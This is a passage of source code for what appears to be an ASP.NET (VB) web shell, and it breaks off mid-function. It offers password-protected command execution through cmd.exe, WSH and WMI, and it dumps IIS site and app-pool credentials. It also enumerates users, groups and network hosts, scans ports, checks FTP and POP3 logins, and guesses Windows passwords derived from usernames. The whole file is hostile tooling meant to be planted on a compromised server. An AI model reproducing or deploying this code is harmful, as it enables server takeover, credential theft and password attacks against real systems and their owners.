<%@ Page Language="VB" ContentType="text/html"  validateRequest="false" aspcompat="true"%>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<%@ import namespace="System.Threading" %>
<%@ import namespace="System.Text" %>
<%@ import namespace="System.Net.Sockets" %>
<%@ import namespace="System.Net" %>
<%@ import namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web" %> 
<%@ Import Namespace="System.Security.Principal" %> 
<%@ Import Namespace="System.Runtime.InteropServices" %> 
<%@ Import Namespace="System" %> 
<%@ Import namespace="System.Security"%>
<%@ import Namespace="Microsoft.Win32" %>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ import Namespace="System.Management" %>
<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>

<script runat="server">
    Dim wBind As String = "T"
    Dim LOGResponsePOP3 As String = ""
    Dim USERNAME As String = "21232f297a57a5a743894a0e4a801fc3"
    Dim PASSWORD As String = "21232f297a57a5a743894a0e4a801fc3"
    Dim url, TEMP1, TEMP2, Computer,Service As String
    Dim TITLE As String
    Dim us ,pa ,ht As String
    Public Declare Function NetUserEnum Lib "Netapi32.dll" ( _
        <MarshalAs(UnmanagedType.LPWStr)> ByVal servername As String, _
        ByVal level As Integer, _
        ByVal filter As Integer, _
        ByRef bufptr As IntPtr, _
        ByVal prefmaxlen As Integer, _
        ByRef entriesread As Integer, _
        ByRef totalentries As Integer, _
        ByRef resume_handle As Integer) As Integer
    
    <DllImport("Netapi32", CharSet:=CharSet.Auto, SetLastError:=True), SuppressUnmanagedCodeSecurityAttribute()> _
    Friend Shared Function NetServerEnum(ByVal ServerNane As String, ByVal dwLevel As Integer, ByRef pBuf As IntPtr, ByVal dwPrefMaxLen As Integer, ByRef dwEntriesRead As Integer, ByRef dwTotalEntries As Integer, _
      ByVal dwServerType As Integer, ByVal domain As String, ByRef dwResumeHandle As Integer) As Integer
    End Function
    <DllImport("Netapi32", SetLastError:=True), SuppressUnmanagedCodeSecurityAttribute()> _
    Friend Shared Function NetApiBufferFree(ByVal pBuf As IntPtr) As Integer
    End Function
    
    <DllImport("NetApi32.dll", SetLastError:=True, CharSet:=CharSet.Unicode)> _
    Friend Shared Function NetUseDel(ByVal UncServerName As String, ByVal UseName As String, ByVal ForceCond As Integer) As Integer
    End Function

    <StructLayout(LayoutKind.Sequential)> _
    Friend Structure SERVER_INFO_100
        Friend sv100_platform_id As Integer
        <MarshalAs(UnmanagedType.LPWStr)> _
        Friend sv100_name As String
    End Structure
    
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Friend Structure USER_INFO_0
        Public name As String
    End Structure
    
    Dim LOGON32_LOGON_INTERACTIVE As Integer = 3
    Dim LOGON32_PROVIDER_DEFAULT As Integer = 0
    Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" ( _
            ByVal sAgent As String, _
            ByVal lAccessType As Int32, _
            ByVal sProxyName As String, _
            ByVal sProxyBypass As String, _
            ByVal lFlags As Integer) As Int32
    Private Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
    Declare Auto Function InternetConnect Lib "wininet.dll" ( _
            ByVal hInternetSession As Int32, _
            ByVal sServerName As String, _
            ByVal nServerPort As Integer, _
            ByVal sUsername As String, _
            ByVal sPassword As String, _
            ByVal lService As Int32, _
            ByVal lFlags As Int32, _
            ByVal lContext As Int32) As Int32

    Declare Auto Function LogonUser Lib "advapi32.dll" (ByVal lpszUsername As String, _
    ByVal lpszDomain As String, _
    ByVal lpszPassword As String, _
    ByVal dwLogonType As Integer, _
    ByVal dwLogonProvider As Integer, _
            ByRef phToken As IntPtr) As Integer
            
    Declare Auto Function DuplicateToken Lib "advapi32.dll" (ByVal ExistingTokenHandle As IntPtr, _
    ByVal ImpersonationLevel As Integer, _
                ByRef DuplicateTokenHandle As IntPtr) As Integer
            
    Dim impersonationContext As WindowsImpersonationContext

    Declare Function LogonUserA Lib "advapi32.dll" (ByVal lpszUsername As String, _
                            ByVal lpszDomain As String, _
                            ByVal lpszPassword As String, _
                            ByVal dwLogonType As Integer, _
                            ByVal dwLogonProvider As Integer, _
                            ByRef phToken As IntPtr) As Integer

    Declare Auto Function RevertToSelf Lib "advapi32.dll" () As Long
    Declare Auto Function CloseHandle Lib "kernel32.dll" (ByVal handle As IntPtr) As Long

    Dim currentWindowsIdentity As WindowsIdentity
   
    Sub LocalGroupUser(ByVal Src As Object, ByVal E As EventArgs)
        Dim admin
        resultLocalGroupUser.Text = "<table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>User Name<b></font></td></tr>"
        'Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
        Dim ComputerName
        Try
            Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
            ComputerName = oScriptNet.ComputerName
        Catch
            ComputerName = "."
        End Try
        Dim oContainer = GetObject("WinNT://" & ComputerName & "/" & lb1local.SelectedItem.Value & ", Group")
        For Each admin In oContainer.Members
            resultLocalGroupUser.Text &= "<tr>"
            resultLocalGroupUser.Text &= "<td><b>" & admin.Name & "</b></td>"
            resultLocalGroupUser.Text &= "</tr>"
        Next
        resultLocalGroupUser.Text &= "</table>"
    End Sub
	
    Private Function impersonateValidUser(ByVal userName As String, ByVal domain As String, ByVal password As String) As Boolean
        Try
            Dim tempWindowsIdentity As WindowsIdentity
            Dim token As IntPtr = IntPtr.Zero
            Dim tokenDuplicate As IntPtr = IntPtr.Zero
            impersonateValidUser = False
            If RevertToSelf() Then
                If LogonUser(userName, domain, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, token) <> 0 Then
                    If DuplicateToken(token, 2, tokenDuplicate) <> 0 Then
                        tempWindowsIdentity = New WindowsIdentity(tokenDuplicate)
                        impersonationContext = tempWindowsIdentity.Impersonate()
                        If Not impersonationContext Is Nothing Then
                            impersonateValidUser = True
                        End If
                    End If
                End If
            End If
            If Not tokenDuplicate.Equals(IntPtr.Zero) Then
                CloseHandle(tokenDuplicate)
            End If
            If Not token.Equals(IntPtr.Zero) Then
                CloseHandle(token)
            End If
            
        Catch
            impersonateValidUser = False
        End Try
    End Function

    Private Sub undoImpersonation()
        impersonationContext.Undo()
    End Sub
    
    Private Function LogonUserRemotly(ByVal userName As String, ByVal domain As String, ByVal password As String, ByVal RemotlyServer As Boolean) As Boolean
        If RemotlyServer Then
            Dim WinNT As String = "WinNT://" & domain & ",computer"
            Dim _entry As New DirectoryEntry(WinNT, userName, password, 0)
            Try
                For Each child As DirectoryEntry In _entry.Children
                    If (child.SchemaClassName = "User") Then
                    End If
                Next
                NetUseDel("", "\\" & domain & "\IPC$", 2)
                Return True
            Catch ex As Exception
                Return False
            End Try
        Else
            Dim token As IntPtr
            If LogonUser(userName, domain, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, token) <> 0 Then
                Return True
            Else
                Return False
            End If
        End If
    End Function

    Sub Page_Load(ByVal Source As Object, ByVal E As EventArgs)
        
        Dim colshoppingList As ArrayList
        If Not Page.IsPostBack Then
            colshoppingList = New ArrayList
            Dim oIADs, ComputerName
            Try
                Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
                ComputerName = oScriptNet.ComputerName
            Catch
                ComputerName = "."
            End Try
            Try
                Dim oContainer = GetObject("WinNT://" & ComputerName & "")
                colshoppingList = New ArrayList
                For Each oIADs In oContainer
                    If (oIADs.Class = "Group") Then
                        colshoppingList.Add(oIADs.Name)
                    End If
                Next
            Catch

            End Try
           
            lb1local.DataSource = colshoppingList
            lb1local.DataBind()
            DomaineName.Text = ComputerName
            IpRvConnect.Text = getIP()
        End If
    End Sub
    Function GetMD5(ByVal strPlain As String) As String
        Dim UE As UnicodeEncoding = New UnicodeEncoding
        Dim HashValue As Byte()
        Dim MessageBytes As Byte() = UE.GetBytes(strPlain)
        Dim md5 As MD5 = New MD5CryptoServiceProvider
        Dim strHex As String = ""
        HashValue = md5.ComputeHash(MessageBytes)
        For Each b As Byte In HashValue
            strHex += String.Format("{0:x2}", b)
        Next
        Return strHex
    End Function
    Sub Login_click(ByVal sender As Object, ByVal E As EventArgs)
        If impersonateValidUser(TextBoxUserName.Text, ".", Server.UrlDecode(TextBoxPassword.Text)) Then
            Session("caterpillar") = 1
            Session.Timeout = 60

        Else
            If GetMD5(TextBoxUserName.Text) = USERNAME And GetMD5(TextBoxPassword.Text) = PASSWORD Then
                Session("caterpillar") = 1
                Session.Timeout = 60
            Else
                Response.Write("<font color='red'>Your password is wrong! Maybe you press the ""Caps Lock"" buttom. Try again.</font><br>")
            End If
        End If
	
    End Sub
    'Run w32 shell
    Declare Function WinExec Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
    Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long

    Public Function GetNetViewEnumUseNetapi32() As ArrayList
        Dim NetViewEnumUseNetapi32 As New ArrayList()
        Const MAX_PREFERRED_LENGTH As Integer = -1
        Const SV_TYPE_WORKSTATION As Integer = 1
        Const SV_TYPE_SERVER As Integer = 2
        Dim buffer As IntPtr = IntPtr.Zero
        Dim tmpBuffer As IntPtr = IntPtr.Zero
        Dim sizeofINFO As Integer = Marshal.SizeOf(GetType(SERVER_INFO_100))
        Dim entriesRead As Integer = 0
        Dim totalEntries As Integer = 0
        Dim resHandle As Integer = 0
        Try
            Dim ret As Integer = NetServerEnum(Nothing, 100, buffer, MAX_PREFERRED_LENGTH, entriesRead, totalEntries, _
              SV_TYPE_WORKSTATION Or SV_TYPE_SERVER, Nothing, resHandle)
            If ret = 0 Then
                Dim i As Integer = 0
                While i < totalEntries
                    tmpBuffer = New IntPtr(buffer.ToInt32 + (i * sizeofINFO))
                    Dim svrInfo As SERVER_INFO_100 = Marshal.PtrToStructure(tmpBuffer, GetType(SERVER_INFO_100))
                    NetViewEnumUseNetapi32.Add(svrInfo.sv100_name.ToUpper())
                    System.Math.Max(System.Threading.Interlocked.Increment(i), i - 1)
                End While
            Else
                NetViewEnumUseNetapi32 = GetNetViewEnumUseExe()
            End If
        Finally
            NetApiBufferFree(buffer)
        End Try
        Return NetViewEnumUseNetapi32
    End Function
    
    Public Function GetNetViewEnumUseExe() As ArrayList
        Dim NetViewEnumUseExe As New ArrayList()
        Dim res As String = GetRunCMD("net view")
        Do While res.IndexOf("\\") <> -1
            res = res.Substring(res.IndexOf("\\") + 2)
            Dim NtPc As String = res.Substring(0, res.IndexOf(" "))
            res = res.Substring(res.IndexOf(" "))
            NetViewEnumUseExe.Add(NtPc.Trim())
        Loop
        Return NetViewEnumUseExe
    End Function
    Sub RunCmdW32(ByVal Src As Object, ByVal E As EventArgs)
        Dim command
        Dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
        Dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\" & fileObject.GetTempName()
        If Request.Form("txtCommand1") = "" Then
            command = "ipconfig /all"
        Else
            command = Request.Form("txtCommand1")
        End If
		Try
        ExecuteCmdW32(command, tempFile)
        resultcmdw32.Text = txtCommand1.Text & vbCrLf & OutputTempFile(tempFile, fileObject)
		Catch ex As Exception
             resultcmdw32.Text = "This function has disabled!"
        End Try 
        txtCommand1.text=""
    End Sub
     Public Function MoveFiles(ByVal sourcePath As String, ByVal DestinationPath As String) as Boolean
	 Response.Write(sourcePath & "<br>")
	 Response.Write(DestinationPath & "<br>")
      If File.Exists(sourcePath) Then
         Try
             File.Move(sourcePath, DestinationPath)
             return True
         Catch ex As Exception
             Response.Write(ex.Message & "<br>")
         End Try 
      else
         return False
      end if
     End Function
    Sub ExecuteCmdW32(ByVal command, ByVal tempFile)
        Dim local_dir, local_copy_of_cmd, Target_copy_of_cmd
        Dim errReturn
        Dim FailIfExists
	
        local_dir = Left(Request.ServerVariables("PATH_TRANSLATED"), InStrRev(Request.ServerVariables("PATH_TRANSLATED"), "\"))
        local_copy_of_cmd = local_dir + "cmd.exe"
        ' local_copy_of_cmd= "C:\\WINDOWS\\system32\\cmd.exe" 
        Target_copy_of_cmd = Environment.GetEnvironmentVariable("Temp") + "\cmd.exe"
        If Not MoveFiles(local_copy_of_cmd, Target_copy_of_cmd) Then
            Response.Write(tempFile & "<br>")
            local_copy_of_cmd = "C:\\WINDOWS\\system32\\cmd.exe"
            If Not MoveFiles(local_copy_of_cmd, Target_copy_of_cmd) Then
                Response.Write(tempFile & "<br>")
            End If
        End If

      '  CopyFile(local_copy_of_cmd, Target_copy_of_cmd, FailIfExists)
        errReturn = WinExec(Target_copy_of_cmd + " /c " + command + "  > " + tempFile, 10)
        Response.Write(errReturn)
        Thread.Sleep(500)
    End Sub
    'End w32 shell
    'Run WSH shell
    Sub RunCmdWSH(ByVal Src As Object, ByVal E As EventArgs)
        Dim command
        Dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
        Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
        Dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\" & fileObject.GetTempName()
        If Request.Form("txtcommand2") = "" Then
            command = "dir c:\"
        Else
            command = Request.Form("txtcommand2")
        End If
        Try
        ExecuteCmdWSH(command, tempFile)
        resultcmdwsh.Text = txtCommand2.Text & vbCrLf & OutputTempFile(tempFile, fileObject) 
        Catch ex As Exception
             resultcmdwsh.Text = "This function has disabled!"
        End Try   
        txtCommand2.Text = ""
    End Sub
    Sub ExecuteCmdWSH(ByVal cmd_to_execute, ByVal tempFile)
        Dim oScript
        oScript = Server.CreateObject("WSCRIPT.SHELL")
        Call oScript.Run("cmd.exe /c " & cmd_to_execute & " > " & tempFile, 0, True)
    End Sub    
    'End WSH shell
    'Run WMI shell
    Sub RunCmdWMI(ByVal Src As Object, ByVal E As EventArgs)
        Dim command
        Dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
        Dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\" & fileObject.GetTempName()
        If txtCommand3.Text = "" Then
            command = "dir c:\"
        Else
            command = txtCommand3.Text
        End If
        Try          
        ExecuteCmdWMI(command, tempFile)
        resultcmdwmi.Text = command & vbCrLf & OutputTempFile(tempFile, fileObject)
        Catch ex As Exception
             resultcmdwmi.Text = "This function has disabled!"
        End Try 
        txtCommand3.Text = ""
    End Sub
    Sub ExecuteCmdWMI(ByVal cmd_to_execute, ByVal tempFile)
        Dim objWMIService, objProcess
        Dim strShell, objProgram, strComputer, strExe
        strComputer = "."
        strExe = "cmd.exe /c " & cmd_to_execute & " > " & """" & tempFile & """"
        objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
        objProcess = objWMIService.Get("Win32_Process")
        objProgram = objProcess.Methods_("Create").InParameters.SpawnInstance_
        objProgram.CommandLine = strExe
        strShell = objWMIService.ExecMethod("Win32_Process", "Create", objProgram)
        Thread.Sleep(500)        
    End Sub
    'End WMI shell
    Function OutputTempFile(ByVal tempFile, ByVal fileObject) as String
    dim res as String =""
        Try
            Dim oFile = fileObject.OpenTextFile(tempFile, 1, False, 0)
            res = "<pre>" & (Server.HtmlEncode(oFile.ReadAll)) & "</pre>"
            oFile.Close()
            Call fileObject.DeleteFile(tempFile, True)
        Catch ex As Exception
            res = ex.Message
        End Try     
            return res
     End Function
    'System infor
    Sub output_all_environment_variables(ByVal mode)
        Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
        Dim de As DictionaryEntry
        For Each de In environmentVariables
            If mode = "HTML" Then
                Response.Write("<b> " + de.Key + " </b>: " + de.Value + "<br>")
            Else
                If mode = "text" Then
                    Response.Write(de.Key + ": " + de.Value + vbNewLine + vbNewLine)
                End If
            End If
        Next
    End Sub
    Sub output_all_Server_variables(ByVal mode)
        Dim item
        For Each item In Request.ServerVariables
            If mode = "HTML" Then
                Response.Write("<b>" + item + "</b> : ")
                Response.Write(Request.ServerVariables(item))
                Response.Write("<br>")
            Else
                If mode = "text" Then
                    Response.Write(item + " : " + Request.ServerVariables(item) + vbNewLine + vbNewLine)
                End If
            End If
        Next
    End Sub
    'End sysinfor
    'Begin List processes
    Sub output_wmi_function_data(ByVal Wmi_Function, ByVal Fields_to_Show, ByVal Status_to_Show,ByVal ip,ByVal us,ByVal pa)
        Dim objProcessInfo, winObj, item, Process_properties, Process_user, Process_domain
        Dim fields_split, fields_item, i, j
			response.Write(ht & "<br>")
			response.Write(us & "<br>")
			response.Write(pa & "<br>")
        If ht <> "" Then
            Dim pcObj = CreateObject("WbemScripting.SWbemLocator")
            winObj = pcObj.ConnectServer(ht, "root/cimv2", us, pa)
            winObj.Security_.impersonationlevel = 3
        Else
            winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
        End If
        
                
        objProcessInfo = winObj.ExecQuery("Select " + Fields_to_Show + " from " + Wmi_Function)
		
        table("0", "", "")
        If Status_to_Show <> "" Then
            Create_table_row_with_supplied_colors("black", "white", "center", Fields_to_Show + "," + Status_to_Show)
        Else
            Create_table_row_with_supplied_colors("black", "white", "center", Fields_to_Show)
        End If
        
        fields_split = Split(Fields_to_Show, ",")
        For Each item In objProcessInfo
            Try
                tr()
                Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
                If UBound(fields_split) > 0 Then
                    For i = 1 To UBound(fields_split)
                        Surround_by_TD(center_(item.properties_.item(fields_split(i)).value))
                    Next
                    Try
                        fields_item = Split(Status_to_Show, ",")
                        If UBound(fields_item) > -1 Then
                            For j = 0 To UBound(fields_item)
                                Dim prostr = "<a href='?action=change&status=" & fields_item(j) & "&src=" & item.properties_.item(fields_split(0)).value & "'" & " onclick='return del(this);'>" & fields_item(j) & " </a>"
                                Surround_by_TD(center_(prostr))
                            Next
                        End If
                    Catch
                    End Try
                End If
                _tr()
            Catch ex As Exception
            End Try
        Next
    End Sub
    Sub KillProByName(ByVal ProcessesName As String)
        Dim pProcess() As Process = System.Diagnostics.Process.GetProcessesByName(ProcessesName)
        For Each p As Process In pProcess
            Try
                p.Kill()
            Catch
            End Try
        Next
    End Sub
    
    Sub HttpFinger(ByVal Src As Object, ByVal E As EventArgs)
        If HttpFingerIp.Text <> "" Then
            resultHttpFinger.Text = ""
            Dim strHostName As String
            Try
                strHostName = System.Net.Dns.GetHostByAddress(HttpFingerIp.Text).HostName
                resultHttpFinger.Text = "<b>" + strHostName + "</b><br><br>"
            Catch
                resultHttpFinger.Text = "<b>HostName Not Found</b><br><br>"
            End Try
            
            Try
                Dim request As WebRequest = WebRequest.Create("http://" + HttpFingerIp.Text)
                request.Credentials = CredentialCache.DefaultCredentials
                Dim response As HttpWebResponse = request.GetResponse()
                resultHttpFinger.Text += "<b>" + Response.Headers.ToString + "</b>"
            Catch err As Exception
                resultHttpFinger.Text += "<b>" + err.Message + "</b>"
            End Try
        End If
    End Sub
    'End List processes
    'Begin Wmi_InstancesOf
    Sub Wmi_InstancesOf(ByVal Wmi_Function, ByVal Fields_to_Show, ByVal MaxCount, ByVal Wmi_Mgmts)
        Dim IIsComputerObj, iFlags, winObj, nodeObj, item, IP, fields_split, i
        ' Dim winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\microsoftIISv2")
        winObj = GetObject(Wmi_Mgmts)
        nodeObj = winObj.InstancesOf(Wmi_Function)
		
        Dim Count = 0
        rw("only showing the first " + CStr(MaxCount) + " items")
        table("1", "", "")
        Create_table_row_with_supplied_colors("black", "white", "center", Fields_to_Show)
        fields_split = Split(Fields_to_Show, ",")
        For Each item In nodeObj
            Count = Count + 1
            tr()
            Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
            If UBound(fields_split) > 0 Then
                For i = 1 To UBound(fields_split)
                    Surround_by_TD(item.properties_.item(fields_split(i)).value)
                Next
            End If
            _tr()
            If Count > MaxCount Then Exit For
        Next
        hr()
    End Sub
    'End Wmi_InstancesOf
    Private Function CheckIsNumber(ByVal sSrc As String) As Boolean
        Dim reg As New System.Text.RegularExpressions.Regex("^0|[0-9]*[1-9][0-9]*$")
        If reg.IsMatch(sSrc) Then
            Return True
        Else
            Return False
        End If
    End Function
    Public Function IISSpy() As String

        Dim appPools As New DirectoryEntry("IIS://localhost/W3SVC/AppPools")
        For Each child As DirectoryEntry In appPools.Children
            'response.write(child.Name.ToString() +"<br>")
            Dim newdir As New DirectoryEntry("IIS://localhost/W3SVC/AppPools" + "/" + child.Name.ToString())
            Response.Write(newdir.Properties("WAMUserName").Value.ToString() + "<br>")
            Response.Write(newdir.Properties("WAMuserPass").Value.ToString() + "<br>")
        Next

        'Dim site2 As New DirectoryEntry("IIS://localhost/W3SVC")
        'response.write(site2.Properties.Item("AnonymousUserName").value.ToString())
			
        'Dim j As Integer = 0
        'For j = 0 To 25000
        'Try
        'Dim site2 As New DirectoryEntry("IIS://localhost/W3SVC/" + j.ToString() + "/ROOT")
        'response.write(site2.Properties("AnonymousUserName").value.ToString()+site2.Properties("AnonymousUserPass").value.ToString()+"<br>")
        'Catch
        'End Try
        'Next

        Dim iisinfo As String = ""
        Dim iisstart As String = ""
        Dim iisend As String = ""
        Dim iisstr As String = "IIS://localhost/W3SVC"
        Dim i As Integer = 0
        Try
            Dim mydir As New DirectoryEntry(iisstr)
            iisstart = "<TABLE width=100% align=center border=0><TR align=center><TD width=5%><B>Order</B></TD><TD width=5%><B>Site ID</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=20%><B>IIS_PASS</B></TD><TD width=20%><B>App_Pool_Id</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>"
            For Each child As DirectoryEntry In mydir.Children
                Try
                    If CheckIsNumber(child.Name.ToString()) Then
                        Dim dirstr As String = child.Name.ToString()
                        Dim tmpstr As String = ""
                        Dim newdir As New DirectoryEntry(iisstr + "/" + dirstr)
                        Dim newdir1 As DirectoryEntry = newdir.Children.Find("root", "IIsWebVirtualDir")
                        i = i + 1
                        iisinfo += "<TR><TD align=center>" + i.ToString() + "</TD>"
                        iisinfo += "<TD align=center>" + child.Name.ToString() + "</TD>"
                        iisinfo += "<TD align=center>" + newdir1.Properties("AnonymousUserName").Value.ToString() + "</TD>"
                        iisinfo += "<TD align=center>" + newdir1.Properties("AnonymousUserPass").Value.ToString() + "</TD>"
                        iisinfo += "<TD align=center>" + newdir1.Properties("AppPoolId").Value.ToString() + "</TD>"
                        iisinfo += "<TD>" + child.Properties("ServerBindings")(0) + "</TD>"
                        iisinfo += "<TD><a href=" + Request.ServerVariables("PATH_INFO") + "?action=goto&src=" + Server.UrlEncode(newdir1.Properties("Path").Value.ToString()) + "\&username=" + Server.UrlEncode(newdir1.Properties("AnonymousUserName").Value.ToString()) + "&password=" + Server.UrlEncode(newdir1.Properties("AnonymousUserPass").Value.ToString()) + ">" + newdir1.Properties("Path").Value.ToString() + "\</a></TD>"
                        iisinfo += "</TR>"
                    End If
                Catch ex As Exception

                End Try
                
            Next
            iisend = "</TABLE>"
        Catch ex As Exception
            Return ex.Message
        End Try
        Return iisstart + iisinfo + iisend
    End Function
    Public Function RegistryReadValue(ByVal data As Object) As ArrayList
        Dim res As New ArrayList()
        Select Case data.GetType().FullName
            Case "System.Byte[]"
                For Each b As Byte In data
                    res.Add(b)
                Next b
            Case "System.String[]"
                For Each s As String In data
                    res.Add(s)
                Next s
            Case Else
                res.Add(data.ToString())
        End Select
        Return res
    End Function
    Sub RunCMD(ByVal Src As Object, ByVal E As EventArgs)
        result.Text = cmd.Text & vbCrLf & "<pre>" & GetRunCMD(cmd.Text) & "</pre>"
        cmd.Text = ""    
    End Sub
    Public Function GetRunCMD(ByVal cmd As String) As String
        Try
            Dim kProcess As New Process()
            Dim kProcessStartInfo As New ProcessStartInfo("cmd.exe")
            kProcessStartInfo.UseShellExecute = False
            kProcessStartInfo.RedirectStandardOutput = True
            kProcess.StartInfo = kProcessStartInfo
            kProcessStartInfo.Arguments = "/c " & cmd
            kProcess.Start()
            Dim myStreamReader As StreamReader = kProcess.StandardOutput
            Dim myString As String = myStreamReader.ReadToEnd()
            kProcess.Close()
            Return myString
        Catch
            Return "This function has disabled!"
        End Try
    End Function
    Public Function CheckPort(ByVal http As String, ByVal port As Integer) As Boolean
        Dim myTcpClient As New TcpClient()
        Try
            myTcpClient.Connect(http, port)
            myTcpClient.Close()
            Return True
        Catch ex As SocketException
            Return False
        End Try
    End Function
    Public Function CheckFtp(ByVal IpAddress As String, ByVal User As String, ByVal Password As String) As Boolean
        Dim hInternet As Int32 = 0, hFtpConnection As Int32 = 0
        hInternet = InternetOpen("Mozilla/6.0 (compatible; MSIE 7.0a; Windows NT 5.2; SV1)", 0, String.Empty, String.Empty, 0)
        hFtpConnection = InternetConnect(hInternet, IpAddress, 21, User, Password, 1, 0, 0)
        If hFtpConnection <> 0 Then
            Return True
        Else
            Return False
        End If
        InternetCloseHandle(hInternet)
        InternetCloseHandle(hFtpConnection)
    End Function
    
    Public Function CheckPOP3(ByVal IpAddress As String, ByVal User As String, ByVal Password As String) As Boolean
        LOGResponsePOP3 = ""
        Try
            Dim POPResponse As String
            Dim Server As TcpClient = New TcpClient(IpAddress, 110)
            Dim NetStrm = Server.GetStream
            Dim RdStrm = New StreamReader(Server.GetStream)
            POPResponse = RdStrm.ReadLine
            LOGResponsePOP3 += POPResponse
            
            Dim data As String = "USER " + User + vbCrLf
            Dim szData() As Byte = System.Text.Encoding.ASCII.GetBytes(data.ToCharArray())
            NetStrm.Write(szData, 0, szData.Length)
            POPResponse = RdStrm.ReadLine
            LOGResponsePOP3 += POPResponse
                        
            data = "PASS " & Password & vbCrLf
            szData = System.Text.Encoding.ASCII.GetBytes(data.ToCharArray())
            NetStrm.Write(szData, 0, szData.Length)
            POPResponse = RdStrm.ReadLine
            LOGResponsePOP3 += POPResponse
                        
            If POPResponse.Substring(0, 3) = "-ER" Then
                data = "QUIT" & vbCrLf
                szData = System.Text.Encoding.ASCII.GetBytes(data.ToCharArray())
                NetStrm.Write(szData, 0, szData.Length)
                POPResponse = RdStrm.ReadLine
                LOGResponsePOP3 += POPResponse
                Server.Close()
                Return False
            Else
                data = "QUIT" & vbCrLf
                szData = System.Text.Encoding.ASCII.GetBytes(data.ToCharArray())
                NetStrm.Write(szData, 0, szData.Length)
                POPResponse = RdStrm.ReadLine
                LOGResponsePOP3 += POPResponse
                Server.Close()
                Return True
            End If
        Catch exc As Exception
            Return False
        End Try
    End Function
    
    Sub RunPortScan(ByVal Src As Object, ByVal E As EventArgs)
        If IpScan.Text <> "" Then
            Dim Ports_split, i
            Dim Ports_to_Scan = PortScan.Text
            Ports_split = Split(Ports_to_Scan, ",")
            resultPortScan.Text = "<hr><table border='1' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Ip Address<b></font></td><td align=center><font color=white><b>Port<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
            For i = 0 To UBound(Ports_split)
                resultPortScan.Text &= "<tr>"
                resultPortScan.Text &= "<td><b>" & IpScan.Text & "</b></td>"
                resultPortScan.Text &= "<td><center>" & Ports_split(i) & "</center></td>"
                If (CheckPort(IpScan.Text, Ports_split(i)) <> False) Then
                    resultPortScan.Text &= "<td><center><font color=red><b>Open</b></font></center></td>"
                Else
                    resultPortScan.Text &= "<td><center>Close</center></td>"
                End If
                resultPortScan.Text &= "</tr>"
            Next
            resultPortScan.Text &= "</table>"
        End If
    End Sub

    Sub RunUserEnumLogin(ByVal Src As Object, ByVal E As EventArgs)
        Dim mypassword As String
        If DomaineName.Text <> "" Then
            Dim usertrue, userfalse As String
            usertrue = ""
            userfalse = ""
            Dim UserName As New ArrayList
            If CheckBoxRemotlyServer.Checked Then
                UserName = GetUserFromRemotlyServer(DomaineName.Text, UserNameRemotly.Text, UserPassword.Text)
            Else
                UserName = GetUserFromLocalhost(DomaineName.Text)
            End If
            
           
            resultUserEnumLogin.Text = "<hr><tr><td><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
            For Each UserTest As String In UserName
                mypassword = UserTest
                If CheckRemovestring.Checked Then
                    If RemoveStringPassword.Text <> "" Then
                        mypassword = mypassword.Replace(RemoveStringPassword.Text, "")
                    End If
                End If
                If CheckPasswordUser.Text <> "" Then
                    mypassword = CheckPasswordUser.Text
                Else
                    If ConcatPasswordUser.Text <> "" Then
                        If CheckBoxAtHome.Checked Then
                            mypassword = ConcatPasswordUser.Text & mypassword
                        Else
                            mypassword = mypassword & ConcatPasswordUser.Text
                        End If
                    End If
                End If

                If CheckBoxReverse.Checked Then
                    mypassword = StrReverse(mypassword)
                End If
                If LogonUserRemotly(UserTest, DomaineName.Text, mypassword, CheckBoxRemotlyServer.Checked) Then
                    usertrue &= "<tr>"
                    usertrue &= "<td><b>" & UserTest & "</b></td>"
                    usertrue &= "<td><center>" & mypassword & "</center></td>"
                    usertrue &= "<td><center><font color=red><b>True</b></font></center></td>"
                    usertrue &= "</tr>"
                Else
                    userfalse &= "<tr>"
                    userfalse &= "<td><b>" & UserTest & "</b></td>"
                    userfalse &= "<td><center>" & mypassword & "</center></td>"
                    userfalse &= "<td><center>False</center></td>"
                    userfalse &= "</tr>"
                End If
            Next
            resultUserEnumLogin.Text &= usertrue & userfalse & "</table>"
        Else
            resultUserEnumLogin.Text = "Insert Domain name"
        End If
    End Sub
    Public Function GetUserFromLocalhost(ByVal DomainName As String) As ArrayList
        Dim UserFromLocalhost As New ArrayList()
        Try
